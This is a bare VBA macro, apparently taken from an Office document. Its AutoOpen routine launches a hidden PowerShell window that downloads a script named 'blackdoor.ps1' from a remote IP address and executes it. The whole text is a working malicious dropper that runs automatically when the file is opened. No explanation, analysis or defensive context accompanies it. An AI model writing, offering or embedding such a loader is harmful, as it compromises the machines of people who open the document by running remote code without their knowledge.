Sub AutoOpen()
	Shell ("powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/blackdoor.ps1')")
End Sub
